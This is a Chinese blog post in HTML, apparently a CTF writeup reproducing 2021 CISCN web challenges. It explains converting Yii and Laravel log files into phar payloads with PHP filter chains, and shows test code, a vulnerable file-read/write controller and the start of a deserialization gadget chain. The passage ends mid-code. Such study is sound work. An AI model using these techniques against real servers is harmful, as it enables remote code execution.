@@ -1,0 +1,1469 @@
+<!DOCTYPE html>
+<html>
+<head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <!-- 页面元数据 -->
+  
+  <title>ciscn 复现writeup - 明月归的小站</title>
+  
+    <meta name="keywords" content="writeup,ciscn">
+  
+
+  
+    <meta name="description" content="复现一下web的题目">
+  
+
+  <!-- feed -->
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  
+    
+<link rel="stylesheet" href="/static/js-css/all.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/static/js-css/font-awesome-animation.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/static/js-css/jquery.fancybox.min.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="/static/js-css/waves.min.css">
+
+  
+
+  
+
+  
+
+  
+
+  <!-- import link -->
+  
+
+  
+  
+    
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+  
+  
+</head>
+
+<body>
+  
+  
+  
+  <div class="cover-wrapper">
+    <cover class='cover post' style="display: none;">
+      <div class='cover-body'>
+  <div class='a'>
+    
+    
+    
+  </div>
+  <div class='b'>
+    <div class='menu navigation dock'>
+      <div class='list-h'>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+      <div class="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+    </cover>
+    <header class="l_header shadow blur">
+  <div class='container'>
+  <div class='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
+        <li><a class="s-comment fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h m-pc'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="Search..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h m-phone'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+  </div>
+  
+
+
+  <div class="l_body nocover">
+    <div class='body-wrapper' id="pjax-container">
+      
+        <!--此文件用来存放一些不方便取值的变量--> 
+<!--思路大概是将值藏到重加载的区域内--> 
+ 
+ 
+ 
+<div id="pjax-data" style="display: none"> 
+  <div id="pjax-ispage">true</div> 
+  <div id="pjax-pageTitle">ciscn 复现writeup</div> 
+  <div id="pjax-enable-cover">true</div> 
+  <div id="pjax-comment-path">none</div> 
+  <div id="pjax-comment-placeholder">none</div> 
+</div> 
+ 
+ 
+<script> 
+  // 处理封面 此时 jquery 还没加载 
+  if ("none" == "none") { // 移除封面 
+    document.getElementsByClassName('cover')[0].style.display = "none"; 
+    document.getElementsByClassName('l_body')[0].classList.add("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.add("show"); 
+  } else { 
+    if ("none" == "blog") { // 半屏 
+      document.getElementsByClassName('cover')[0].classList.remove("full"); 
+      document.getElementsByClassName('cover')[0].classList.add("half"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = "none"; 
+    } else if ("none" == "docs") { // 全屏 
+      document.getElementsByClassName('cover')[0].classList.remove("half"); 
+      document.getElementsByClassName('cover')[0].classList.add("full"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = ""; 
+    } 
+    document.getElementsByClassName('cover')[0].style.display = ""; 
+    document.getElementsByClassName('l_body', 'show')[0].classList.remove("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.remove("show"); 
+  } 
+</script> 
+
+      
+      
+
+<div class='l_main'>
+  
+
+  
+    <article id="post" class="post white-box reveal shadow article-type-post" itemscope itemprop="blogPost">
+      
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h1 class="title">
+    <a href="/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/">
+      ciscn 复现writeup
+    </a>
+  </h1>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="/pic/youxiang.jpg">
+    <p>MoonBack</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2021年8月30日</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+  <div class="new-meta-item wordcount">
+    <a class='notlink'>
+      <i class="fas fa-keyboard fa-fw" aria-hidden="true"></i>
+      <p>字数：6.3k字</p>
+    </a>
+  </div>
+  <div class="new-meta-item readtime">
+    <a class='notlink'>
+      <i class="fas fa-hourglass-half fa-fw" aria-hidden="true"></i>
+      <p>时长：34分钟</p>
+    </a>
+  </div>
+
+
+            
+          
+            
+              
+  <div class="new-meta-item browse valine">
+    <a class='notlink'>
+      <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+      
+      <span id="/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/" class="leancloud_visitors" data-flag-title="ciscn 复现writeup">
+      <p>
+        <span class="leancloud-visitors-count"></span>
+      </p>
+      </span>
+    </a>
+  </div>
+
+
+            
+          
+            
+              
+<div class="new-meta-item comments-count">
+  
+  <a href="/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/#comments">
+    <i class="fas fa-comment-dots fa-fw"></i>
+    <span class="valine-comment-count" data-xid="/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/">0</span>
+    <span class="leancloud-comments-count">&nbsp;</span>
+  </a>
+</div>
+
+
+            
+          
+            
+              
+
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+      <section class="article typo">
+        <div class="article-entry" itemprop="articleBody">
+          
+          
+          <p>复现一下web的题目</p>
+<a id="more"></a>
+
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/243076">https://www.anquanke.com/post/id/243076</a></p>
+<p><a target="_blank" rel="noopener" href="http://rayi.vip/2021/05/30/2021%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%81%94%E8%B5%9BWriteUp/">http://rayi.vip/2021/05/30/2021%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%81%94%E8%B5%9BWriteUp/</a></p>
+<p><a target="_blank" rel="noopener" href="https://ha1c9on.top/2021/01/14/laravel-842-rce/">https://ha1c9on.top/2021/01/14/laravel-842-rce/</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9165">https://xz.aliyun.com/t/9165</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9030">https://xz.aliyun.com/t/9030</a></p>
+<p><a target="_blank" rel="noopener" href="https://tyaoo.github.io/2021/05/28/Laravel-Debug-mode-RCE%E5%A4%8D%E7%8E%B0/">https://tyaoo.github.io/2021/05/28/Laravel-Debug-mode-RCE%E5%A4%8D%E7%8E%B0/</a></p>
+<h2 id="Quals"><a href="#Quals" class="headerlink" title="Quals"></a>Quals</h2><h3 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h3><h4 id="编码的trick"><a href="#编码的trick" class="headerlink" title="编码的trick"></a>编码的trick</h4><p>题目基本都是一个思路 主要用到了以下过滤器</p>
+<table>
+<thead>
+<tr>
+<th align="center">过滤器名称</th>
+<th align="center">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">convert.base64-encode</td>
+<td align="center">base64编码，等效于base64_encode函数</td>
+</tr>
+<tr>
+<td align="center">convert.base64-decode</td>
+<td align="center">base64解码，等效于base64_decode函数</td>
+</tr>
+<tr>
+<td align="center">convert.quoted-printable-encode</td>
+<td align="center">将 8-bit 字符串转换成 quoted-printable 字符串，等效于quoted_printable_encode函数</td>
+</tr>
+<tr>
+<td align="center">convert.quoted-printable-decode</td>
+<td align="center">将 quoted-printable 字符串转换为 8-bit 字符串，等效于quoted_printable_decode函数</td>
+</tr>
+<tr>
+<td align="center">convert.iconv.utf-16le.utf-8</td>
+<td align="center">utf-16le转换成utf-8编码，iconv函数</td>
+</tr>
+<tr>
+<td align="center">convert.iconv.utf-8.utf-16be</td>
+<td align="center">utf-8转换成utf-16le编码，iconv函数</td>
+</tr>
+</tbody></table>
+<p>看下效果</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> quoted_printable_encode(<span class="string">&quot;test123\x00\xff&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> quoted_printable_decode(<span class="string">&quot;test123=00=ff&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> iconv(<span class="string">&quot;UTF-8&quot;</span>, <span class="string">&quot;utf-16le&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> iconv(<span class="string">&quot;utf-16le&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="string">&quot;t\x00e\x00s\x00t\x00&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/image-20210910174821907.png" alt="image-20210910174821907"></p>
+<p>**注意 utf-16le -&gt; UTF-8的过程 payload前面的字符必须是偶数个 并且总长度也要是偶数个 **</p>
+<p><strong>也就是经过第一次quoted_printable_encode转化得到的结果一定是偶数</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">echo iconv(&quot;utf-16le&quot;, &quot;UTF-8&quot;, &quot;2021-09-10 18:16:03 [127.0.0.1][-][-][error][yii\base\ErrorException:2] yii\base\ErrorException: file_get_contents(t\x00e\x00s\x00t\x00&quot;);</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">echo iconv(&quot;utf-16le&quot;, &quot;UTF-8&quot;, &quot;2021-09-10 18:16:03 [127.0.0.1][-][-][error][yii\base\ErrorException:2] yii\base\ErrorException: file_get_contents(at\x00e\x00s\x00t\x00&quot;);</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">echo iconv(&quot;utf-16le&quot;, &quot;UTF-8&quot;, &quot;2021-09-10 18:16:03 [127.0.0.1][-][-][error][yii\base\ErrorException:2] yii\base\ErrorException: file_get_contents(at\x00e\x00s\x00t\x00a&quot;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/image-20210910182842467.png" alt="image-20210910182842467"></p>
+<p><strong>偶数个payload怎么办？</strong></p>
+<p>首先要知道一点的是 偶数个payload 无论payload长度是奇数还是偶数 所有payload加到一块都是都会是偶数 如果日志本身原来就是奇数 就会利用失败</p>
+<p>这时候就可以生成两组日志 这样之和就是偶数了</p>
+<p><strong>多个payload如何转变成一个？</strong></p>
+<p>两个payload之间的间隔如果是偶数的话 只需在payload后面加一个字符就能让间距变成奇数 从而在 utf-16le -&gt; UTF-8的过程中不是正常转换的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$s = quoted_printable_decode(<span class="string">&quot;xxxx=5A=00=32=00=6C=00=6D=00xxxx=5A=00=32=00=6C=00=6D=00xxxx&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> $s.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$s = iconv(<span class="string">&quot;utf-16le&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>, $s);</span><br><span class="line"><span class="keyword">echo</span> $s.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$s = base64_decode($s);</span><br><span class="line"><span class="keyword">echo</span> $s.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">$s = quoted_printable_decode(<span class="string">&quot;xxxx=5A=00=32=00=6C=00=6D=00axxxx=5A=00=32=00=6C=00=6D=00axxxx&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> $s.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$s = iconv(<span class="string">&quot;utf-16le&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>, $s);</span><br><span class="line"><span class="keyword">echo</span> $s.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$s = base64_decode($s);</span><br><span class="line"><span class="keyword">echo</span> $s.<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/image-20210910214519704.png" alt="image-20210910214519704"></p>
+<p><strong>具体流程：</strong></p>
+<p>本地生成时对phar文件进行如下编码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">base64_encode</span><br><span class="line">quoted_printable_encode</span><br></pre></td></tr></table></figure>
+
+<p>log转化为phar文件时</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode</span><br></pre></td></tr></table></figure>
+
+<p>如果出现下面 说明生成出错了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stream filter (convert.quoted-printable-decode): invalid byte sequence</span><br></pre></td></tr></table></figure>
+
+<p>本地测试用函数的形式可以生成phar文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$s = file_get_contents(<span class="string">&quot;1.log&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;log:&quot;</span>.strlen($s).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$s = quoted_printable_decode($s);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;quote:&quot;</span>.strlen($s).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;quote:&quot;</span>.$s.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$s = iconv(<span class="string">&quot;utf-16le&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>, $s);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;iconv:&quot;</span>.$s.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;iconv:&quot;</span>.strlen($s).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$s = base64_decode($s);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;base64_decode:&quot;</span>.$s.<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/image-20210911170936110.png" alt="image-20210911170936110"></p>
+<p>貌似不一样 通过下面代码才能成功</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$s = file_get_contents(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">$fp = fopen(<span class="string">&#x27;php://temp&#x27;</span>, <span class="string">&#x27;rw+&#x27;</span>);</span><br><span class="line">stream_filter_append($fp, <span class="string">&#x27;convert.quoted-printable-decode&#x27;</span>, STREAM_FILTER_WRITE);</span><br><span class="line">fwrite($fp, $s);</span><br><span class="line">rewind($fp);</span><br><span class="line">$s = stream_get_contents($fp);</span><br><span class="line">fclose($fp);</span><br><span class="line"><span class="keyword">echo</span> $s;</span><br><span class="line"></span><br><span class="line">$fp = fopen(<span class="string">&#x27;php://temp&#x27;</span>, <span class="string">&#x27;rw+&#x27;</span>);</span><br><span class="line">stream_filter_append($fp, <span class="string">&#x27;convert.iconv.utf-16le.utf-8&#x27;</span>, STREAM_FILTER_WRITE);</span><br><span class="line">fwrite($fp, $s);</span><br><span class="line">rewind($fp);</span><br><span class="line">$s = stream_get_contents($fp);</span><br><span class="line">fclose($fp);</span><br><span class="line"><span class="keyword">echo</span> $s;</span><br><span class="line"></span><br><span class="line">$fp = fopen(<span class="string">&#x27;php://temp&#x27;</span>, <span class="string">&#x27;rw+&#x27;</span>);</span><br><span class="line">stream_filter_append($fp, <span class="string">&#x27;convert.base64-decode&#x27;</span>, STREAM_FILTER_WRITE);</span><br><span class="line">fwrite($fp, $s);</span><br><span class="line">rewind($fp);</span><br><span class="line">$s = stream_get_contents($fp);</span><br><span class="line">fclose($fp);</span><br><span class="line"><span class="keyword">echo</span> $s;</span><br></pre></td></tr></table></figure>
+
+<p>在测试中 发现了下面报错的原因</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stream filter (convert.quoted-printable-decode): invalid byte sequence in</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/image-20210911175625636.png" alt="image-20210911175625636"></p>
+<p>就是因为=号的原因 会导致空格+[ 也是编码后的结果 正常编码应该是=加上16进制形式 三个字符</p>
+<p>然后解码出错 前面后面有都不行</p>
+<p><strong>为什么laravel要加一个=00？</strong></p>
+<p>laravel日志 payload前面是53个字符 加上=00相当于三个字符 payload前面就变成56个字符了 满足解码payload前面是偶数个的要求</p>
+<p><img src="/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/image-20210911183437849.png" alt="image-20210911183437849"></p>
+<p>laravel是有两处完整payload的  还有一部分不完整的</p>
+<p><img src="/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/image-20210911183944132.png" alt="image-20210911183944132"></p>
+<p>不完整部分 </p>
+<p><img src="/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/image-20210911184213643.png" alt="image-20210911184213643"></p>
+<p>第二处payload的前面字符数量包含前面的payload</p>
+<p>整体满足下面格式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">53*字符 + &#x3D;00 + PAYLOAD + 110*字符 + &#x3D;00 + PAYLOAD + 部分字符(字符数量不确定) + &#x3D;00 + 部分PAYLOAD</span><br></pre></td></tr></table></figure>
+
+<p>不加=00</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">53*字符 + PAYLOAD + 110*字符 + PAYLOAD + 部分字符(字符数量不确定) + 部分PAYLOAD</span><br></pre></td></tr></table></figure>
+
+<p>也就是说我们需要保证第一处或者第二处payload前面的字符是偶数 且两者是对立的 也就是另外一处前面的字符就要是奇数个</p>
+<p>第三处payload前面的字符一定要是奇数个 就能构造出payload </p>
+<p>难以控制的就是部分字符那处 假如我们需要第一个位置作为payload 那就需要构造如下条件：</p>
+<ul>
+<li>payload前一定要加上奇数个字符</li>
+<li>payload本身如果是奇数 就会解码失败 因为第一处payload前面是奇数个字符 所以说phar payload本身一定要是偶数</li>
+</ul>
+<p>加上=00三个字符刚好满足上面两个条件 </p>
+<p><strong>为什么加一个字符不行？</strong></p>
+<p>因为加一个字符 在不完整payload那里 就会出现类似=6.的形式 导致解码失败</p>
+<p>本地测了下三处payload前面字符长度都是满足的 即第一处为偶数 其他两处为偶数</p>
+<p><img src="/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/image-20210911190247555.png" alt="image-20210911190247555"></p>
+<p>看完laravel 再看下yii 最终拿到shell之后 把源码down在本地</p>
+<p>windows下的日志 好多等号 这就影响成功性了：</p>
+<p><img src="/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/image-20210911220531242.png" alt="image-20210911220531242"></p>
+<p>linux下的日志 没有多余的等好的</p>
+<p><img src="/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/image-20210911220920677.png" alt="image-20210911220920677"></p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>不同的框架或者不同的版本payload在日志出现的次数和位置不尽相同 但要达到利用需要满足如下条:</p>
+<ol>
+<li>作为转换为phar的那部分payload之前地字符必须是偶数，并且不存在不规范的quoted-printable编码</li>
+<li>其他可能影响转换为phar的payload之前的字符必须是奇数</li>
+<li>经过条件一转换后的结果必须是偶数</li>
+</ol>
+<h4 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h4><p>yii 和laravel debug rce 一个思路</p>
+<p>给了composer.json 看下文件时间 去：<a target="_blank" rel="noopener" href="https://github.com/yiisoft/yii2/releases">https://github.com/yiisoft/yii2/releases</a> 下载</p>
+<p><img src="/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/image-20210910145013711.png" alt="image-20210910145013711"></p>
+<p>然后替换config/console.php里对log的配置 替换controller</p>
+<p><img src="/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/image-20210910124700577.png" alt="image-20210910124700577"></p>
+<p>运行这个设置cookie加密key</p>
+<p><img src="/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/image-20210910145411619.png" alt="image-20210910145411619"></p>
+<p>至此环境就算配好了 关键代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $file = Yii::$app-&gt;request-&gt;get(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line">    $res = file_get_contents($file);</span><br><span class="line">    file_put_contents($file,$res);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;render(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>本地测试下 发现下面的链子可用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">class</span> <span class="title">DefaultGenerator</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">default</span> ;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$argv</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;default = $argv;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> 